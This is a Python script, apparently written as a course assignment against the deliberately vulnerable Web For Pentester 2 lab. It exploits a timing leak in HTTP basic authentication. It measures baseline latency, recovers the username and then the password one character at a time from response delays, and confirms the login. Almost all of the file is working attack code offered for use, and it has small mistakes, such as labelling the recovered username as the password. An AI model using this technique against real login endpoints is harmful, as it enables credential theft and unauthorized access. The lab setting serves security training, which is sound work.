#! /usr/bin/env python

#Program #2 (​WFP2: Authentication #2)
#● The authentication routine leaks timing information that allows
#  adversary to guess characters of both the username and
#  password
#● Write a Python program that uses the vulnerability to
#  automatically determine the username and password
#● Note that both are alpha-numeric

import sys
import requests
import time
from requests.auth import HTTPBasicAuth

# check if arguments are present
if len(sys.argv) < 2:
  print("Usage: {} http://example.com".format(sys.argv[0]))
  sys.exit(1)
else:
  host = sys.argv[1]
  print("Using hostname: {}".format(host))

baseurl = "/authentication/example2/"
url = host + baseurl

# need to know username before this or this wont work....this sucks
# run a loop 10 times to get network overhead with passwords that are not alpha-numeric
# this way we can adjust our timeing based on network latency, etc
total_time = 0.0
runs = 10
for i in range(0,runs):
    # guaranteed not to work since these are not alpha-numeric
    user = "#"
    password = "#"
    before = time.time()
    r = requests.get(url, auth=HTTPBasicAuth(user, password))
    after = time.time()
    total_time += (after - before)


username = ''
password = ''
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
success = False
average_time = float(total_time / runs)
print("Average time with guaranteed incorrect combinations: {}".format(average_time))
done_username = False
count = len(username)

####### FIND THE USERNAME BASED ON TIMING ATTACK #############

while not done_username:
    # get next character from the password
    # want to check we are done by seeing if we went through the list of characters  without a guess
    print("prev len: {0} new len: {1}".format(count, len(username)))
    if(count == len(username)):
      done_username = False
      count += 1
    else:
      done_username = True
      break

    for char in chars:
        guessed_username = username + char
        # just guessing username, no need for correct password
        # we can ignore password by making it an invalid non-alphanumeric char
        guessed_password = ""
        # get time before doing requests
        before = time.time()
        r = requests.get(url, auth=HTTPBasicAuth(guessed_username, guessed_password))
        after = time.time()
        total_time = after - before
        print("Tried username: {0} with time {1}".format(guessed_username, total_time))
        if(total_time >= average_time + (0.18*len(guessed_username))):
            # average results again to make sure it is correct
            bulk = 0.0
            for i in range(0,5):
              before = time.time()
              r = requests.get(url, auth=HTTPBasicAuth(guessed_username, guessed_password))
              after = time.time()
              bulk += (after - before)
            avg = bulk/5
            if(avg >= average_time + (0.18*len(guessed_username))):
              print("correctly guessed username: {0}".format(guessed_username))
              username += char
              break

print("FOUND THE PASSWORD: {0}".format(username))

######################### FIND THE PASSWORD BASED ON TIMING ATTACK #####################
# in the effort of time, we will use a username empty string '' that is not a valid username
# this way we do not have to wait 0.2*len(username) extra seconds per time as we know this does not match
done_password = False
password = ''
p_count = len(password)
while not done_password:
    print("prev len: {0} new len: {1}".format(p_count, len(password)))
    if(p_count == len(password)):
      done_password = False
      p_count += 1
    else:
      done_password = True
      break

    for char in chars:
        guessed_username = username
        guessed_password = password + char
        # get time before doing requests
        before = time.time()
        r = requests.get(url, auth=HTTPBasicAuth(guessed_username, guessed_password))
        after = time.time()
        total_time = after - before
        print("Tried password: {0} with time {1}".format(guessed_password, total_time))
        if(total_time >= average_time + (0.21*(len(guessed_password)+len(guessed_username)))):
            # average results again to make sure it is correct
            bulk = 0.0
            for i in range(0,5):
              before = time.time()
              r = requests.get(url, auth=HTTPBasicAuth(guessed_username, guessed_password))
              after = time.time()
              bulk += (after - before)
            avg = bulk/5
            if(avg >= average_time + (0.21*(len(guessed_password)+len(guessed_username)))):
              print("correctly guessed password: {0}".format(guessed_password))
              password += char
              break

print("FOUND THE PASSWORD: {0}".format(password))

###### check username and password combination #######

r = requests.get(url, auth=HTTPBasicAuth(username, password))

if ("Success!" in r.text):
  print("Successfully found combo: {0},{1}".format(username, password))
else:
  print("Found invalid username and password combination (possible network time latency issues): {0},{1}".format(username, password))
